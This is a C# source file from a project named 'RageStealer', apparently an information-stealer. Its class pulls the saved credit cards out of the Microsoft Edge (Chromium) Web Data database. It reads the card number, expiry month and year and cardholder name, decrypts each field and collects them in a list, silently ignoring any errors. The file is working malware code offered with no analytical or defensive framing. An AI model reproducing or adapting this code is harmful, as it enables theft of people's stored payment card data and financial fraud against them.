using System;
using System.Collections.Generic;
using RageStealer.Helper;
using RageStealer.Target.Browsers.Chromium;

namespace RageStealer.Target.Browsers.Edge;

internal sealed class CreditCards
{
	public static List<CreditCard> Get(string sWebData)
	{
		List<CreditCard> list = new List<CreditCard>();
		try
		{
			SqLite sqLite = SqlReader.ReadTable(sWebData, "credit_cards");
			if (sqLite == null)
			{
				return list;
			}
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				CreditCard creditCard = default(CreditCard);
				creditCard.Number = RageStealer.Target.Browsers.Chromium.Crypto.GetUtf8(RageStealer.Target.Browsers.Chromium.Crypto.EasyDecrypt(sWebData, sqLite.GetValue(i, 4)));
				creditCard.ExpYear = RageStealer.Target.Browsers.Chromium.Crypto.GetUtf8(RageStealer.Target.Browsers.Chromium.Crypto.EasyDecrypt(sWebData, sqLite.GetValue(i, 3)));
				creditCard.ExpMonth = RageStealer.Target.Browsers.Chromium.Crypto.GetUtf8(RageStealer.Target.Browsers.Chromium.Crypto.EasyDecrypt(sWebData, sqLite.GetValue(i, 2)));
				creditCard.Name = RageStealer.Target.Browsers.Chromium.Crypto.GetUtf8(RageStealer.Target.Browsers.Chromium.Crypto.EasyDecrypt(sWebData, sqLite.GetValue(i, 1)));
				CreditCard item = creditCard;
				list.Add(item);
			}
		}
		catch (Exception)
		{
		}
		return list;
	}
}
